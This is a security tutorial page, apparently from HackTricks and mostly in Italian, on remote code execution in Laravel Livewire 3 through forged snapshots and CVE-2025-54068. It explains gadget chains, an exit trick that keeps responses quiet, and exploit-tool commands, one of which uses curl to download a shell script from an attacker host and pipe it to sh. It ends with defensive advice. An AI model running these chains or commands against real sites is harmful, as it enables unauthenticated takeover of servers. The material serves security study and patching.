# Laravel Livewire Hydration & Synthesizer Abuse

{{#include ../../banners/hacktricks-training.md}}

## Riepilogo della macchina a stati di Livewire

I componenti Livewire 3 scambiano il loro stato tramite **snapshot** che contengono `data`, `memo` e un checksum. Ogni POST a `/livewire/update` ri-idrata lo snapshot JSON sul server ed esegue le `calls`/`updates` in coda.
```php
class Checksum {
static function verify($snapshot) {
$checksum = $snapshot['checksum'];
unset($snapshot['checksum']);
if ($checksum !== self::generate($snapshot)) {
throw new CorruptComponentPayloadException;
}
}

static function generate($snapshot) {
return hash_hmac('sha256', json_encode($snapshot), $hashKey);
}
}
```
Chiunque possegga `APP_KEY` (usata per derivare `$hashKey`) può quindi falsificare istantanee arbitrarie ricalcolando l'HMAC.

Le proprietà complesse sono codificate come **tuple sintetiche** rilevate da `Livewire\Drawer\BaseUtils::isSyntheticTuple()`; ogni tupla è `[value, {"s":"<key>", ...meta}]`. Il core di hydration delega semplicemente ogni tupla al synth selezionato in `HandleComponents::$propertySynthesizers` e procede ricorsivamente sui figli:
```php
protected function hydrate($valueOrTuple, $context, $path)
{
if (! Utils::isSyntheticTuple($value = $tuple = $valueOrTuple)) return $value;
[$value, $meta] = $tuple;
$synth = $this->propertySynth($meta['s'], $context, $path);
return $synth->hydrate($value, $meta, fn ($name, $child)
=> $this->hydrate($child, $context, "{$path}.{$name}"));
}
```
Questo design ricorsivo rende Livewire un **motore generico di istanziazione di oggetti** non appena un attaccante controlla oppure i metadata della tupla o qualsiasi tupla annidata processata durante la ricorsione.

## Synthesizers that grant gadget primitives

| Synthesizer | Attacker-controlled behaviour |
|-------------|--------------------------------|
| **CollectionSynth (`clctn`)** | Istanzia `new $meta['class']($value)` dopo aver reidratato ogni child. Qualsiasi classe con un costruttore che accetta un array può essere creata, e ogni elemento può a sua volta essere una tupla sintetica.
| **FormObjectSynth (`form`)** | Chiama `new $meta['class']($component, $path)`, poi assegna ogni proprietà pubblica dai figli controllati dall'attaccante tramite `$hydrateChild`. I costruttori che accettano due parametri poco tipizzati (o argomenti di default) sono sufficienti per raggiungere proprietà pubbliche arbitrarie.
| **ModelSynth (`mdl`)** | Quando `key` è assente nei meta, esegue `return new $class;` permettendo l'istanziazione senza argomenti di qualsiasi classe sotto controllo dell'attaccante.

Poiché i sintetizzatori invocano `$hydrateChild` su ogni elemento annidato, grafi di gadget arbitrari possono essere costruiti impilando tuple in modo ricorsivo.

## Forging snapshots when `APP_KEY` is known

1. Cattura una richiesta legittima `/livewire/update` e decodifica `components[0].snapshot`.
2. Inietta tuple nidificate che puntano a classi gadget e ricalcola `checksum = hash_hmac('sha256', json_encode(snapshot_without_checksum), APP_KEY)`.
3. Ricodifica lo snapshot, lascia `_token`/`memo` intatti e riproduci la richiesta.

Una prova minima di esecuzione usa **Guzzle's `FnStream`** e **Flysystem's `ShardedPrefixPublicUrlGenerator`**. Una tupla istanzia `FnStream` con dati del costruttore `{ "__toString": "phpinfo" }`, la successiva istanzia `ShardedPrefixPublicUrlGenerator` con `[FnStreamInstance]` come `$prefixes`. Quando Flysystem caste ogni prefisso a `string`, PHP invoca la callable `__toString` fornita dall'attaccante, chiamando qualsiasi funzione senza argomenti.

### From function calls to full RCE

Sfruttando le primitive di istanziazione di Livewire, Synacktiv ha adattato la catena `phpggc` `Laravel/RCE4` in modo che la reidratazione avvii un oggetto il cui stato pubblico Queueable innesca la deserializzazione:

1. **Queueable trait** – qualsiasi oggetto che usa `Illuminate\Bus\Queueable` espone `$chained` pubblico ed esegue `unserialize(array_shift($this->chained))` in `dispatchNextJobInChain()`.
2. **BroadcastEvent wrapper** – `Illuminate\Broadcasting\BroadcastEvent` (ShouldQueue) viene istanziato via `CollectionSynth` / `FormObjectSynth` con `$chained` pubblico popolato.
3. **phpggc Laravel/RCE4Adapted** – il blob serializzato memorizzato in `$chained[0]` costruisce `PendingBroadcast -> Validator -> SerializableClosure\Serializers\Signed`. `Signed::__invoke()` alla fine chiama `call_user_func_array($closure, $args)` permettendo `system($cmd)`.
4. **Stealth termination** – fornendo una seconda callable `FnStream` come `[new Laravel\Prompts\Terminal(), 'exit']`, la richiesta termina con `exit()` invece di un'eccezione rumorosa, mantenendo pulita la risposta HTTP.

### Automating snapshot forgery

`synacktiv/laravel-crypto-killer` ora include una modalità `livewire` che mette tutto insieme:
```bash
./laravel_crypto_killer.py exploit -e livewire -k base64:APP_KEY \
-j request.json --function system -p "bash -c 'id'"
```
Lo strumento analizza lo snapshot catturato, inietta i gadget tuples, ricalcola il checksum e stampa un payload `/livewire/update` pronto per l'invio.

## CVE-2025-54068 – RCE senza `APP_KEY`

Secondo l'avviso del vendor, il problema interessa Livewire v3 (>= 3.0.0-beta.1 e < 3.6.3) ed è unico per v3.

`updates` vengono fusi nello stato del componente **dopo** che il checksum dello snapshot è stato validato. Se una proprietà all'interno dello snapshot è (o diventa) una tupla sintetica, Livewire riutilizza i suoi meta mentre idrata il valore di update controllato dall'attaccante:
```php
protected function hydrateForUpdate($raw, $path, $value, $context)
{
$meta = $this->getMetaForPath($raw, $path);
if ($meta) {
return $this->hydrate([$value, $meta], $context, $path);
}
}
```
Exploit recipe:

1. Find a Livewire component with an untyped public property (e.g., `public $count;`).
2. Send an update that sets that property to `[]`. The next snapshot now stores it as `[[], {"s": "arr"}]`.

A minimal type-juggling flow looks like this:

```http
POST /livewire/update
...
"updates": {"count": []}
```

Then the next snapshot stores a tuple that keeps the `arr` synthesizer metadata:

```json
"count": [[], {"s": "arr"}]
```

3. Craft another `updates` payload where that property contains a deeply nested array embedding tuples such as `[ <payload>, {"s":"clctn","class":"GuzzleHttp\\Psr7\\FnStream"} ]`.
4. During recursion, `hydrate()` evaluates each nested child independently, so attacker-chosen synth keys/classes are honoured even though the outer tuple and checksum never changed.
5. Reuse the same `CollectionSynth`/`FormObjectSynth` primitives to instantiate a Queueable gadget whose `$chained[0]` contains the phpggc payload. Livewire processes the forged updates, invokes `dispatchNextJobInChain()`, and reaches `system(<cmd>)` without knowing `APP_KEY`.

Key reasons this works:

- `updates` are not covered by the snapshot checksum.
- `getMetaForPath()` trusts whichever synth metadata already existed for that property even if the attacker previously forced it to become a tuple via weak typing.
- La ricorsione combinata con la tipizzazione debole permette a ogni array annidato di essere interpretato come un nuovo tuple, quindi chiavi synth arbitrarie e classi arbitrarie raggiungono infine la hydration.

## Livepyre – end-to-end exploitation

[Livepyre](https://github.com/synacktiv/Livepyre) automates both the APP_KEY-less CVE and the signed-snapshot path:

- Fingerprints the deployed Livewire version by parsing `<script src="/livewire/livewire.js?id=HASH">` and mapping the hash to vulnerable releases.
- Raccoglie snapshot di base riproducendo azioni innocue e estraendo `components[].snapshot`.
- Generates either an `updates`-only payload (CVE-2025-54068) or a forged snapshot (known APP_KEY) embedding the phpggc chain.
- If no object-typed parameter is found in a snapshot, Livepyre falls back to brute-forcing candidate params to reach a coercible property.

Typical usage:
```bash
# CVE-2025-54068, unauthenticated
python3 Livepyre.py -u https://target/livewire/component -f system -p id

# Signed snapshot exploit with known APP_KEY
python3 Livepyre.py -u https://target/livewire/component -a base64:APP_KEY \
-f system -p "bash -c 'curl attacker/shell.sh|sh'"
```
`-c/--check` esegue una probe non distruttiva, `-F` salta il version gating, `-H` e `-P` aggiungono header personalizzati o proxy, e `--function/--param` personalizzano la funzione php invocata dalla gadget chain.

## Considerazioni difensive

- Aggiornare ai build Livewire corretti (>= 3.6.4 secondo il vendor bulletin) e applicare la patch del vendor per CVE-2025-54068.
- Evitare proprietà pubbliche debolmente tipizzate nei componenti Livewire; tipi scalari espliciti impediscono che i valori delle proprietà vengano coerciti in arrays/tuples.
- Registrare solo i synthesizers strettamente necessari e trattare i metadati controllati dall'utente (`$meta['class']`) come non attendibili.
- Rifiutare aggiornamenti che modificano il tipo JSON di una proprietà (es., scalar -> array) salvo sia esplicitamente consentito, e ricalcolare i synth metadata invece di riusare tuple obsolete.
- Ruotare `APP_KEY` prontamente dopo qualsiasi divulgazione perché consente la creazione offline di snapshot contraffatti indipendentemente da quanto la base di codice sia patchata.

## Riferimenti

- [Synacktiv – Livewire: Remote Command Execution via Unmarshaling](https://www.synacktiv.com/publications/livewire-execution-de-commandes-a-distance-via-unmarshaling.html)
- [synacktiv/laravel-crypto-killer](https://github.com/synacktiv/laravel-crypto-killer)
- [synacktiv/Livepyre](https://github.com/synacktiv/Livepyre)
- [GHSA-29cq-5w36-x7w3 – Livewire v3 RCE advisory](https://github.com/livewire/livewire/security/advisories/GHSA-29cq-5w36-x7w3)

{{#include ../../banners/hacktricks-training.md}}
